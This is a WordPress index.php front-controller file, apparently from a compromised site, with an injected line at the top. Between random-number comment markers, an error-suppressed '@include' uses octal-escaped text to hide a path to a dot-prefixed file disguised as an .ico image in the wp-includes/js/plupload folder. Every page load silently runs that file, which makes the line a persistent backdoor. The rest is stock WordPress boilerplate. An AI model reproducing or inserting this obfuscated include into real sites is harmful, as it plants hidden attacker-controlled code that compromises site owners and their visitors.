<?php
/*67831*/

@include "\057ho\155e/\154ea\144an\144c/\160ub\154ic\137ht\155l/\143ar\151ns\165ra\156ce\161uo\164es\151nc\056co\155/w\160-i\156cl\165de\163/j\163/p\154up\154oa\144/.\06055\063a3\060e.\151co";

/*67831*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
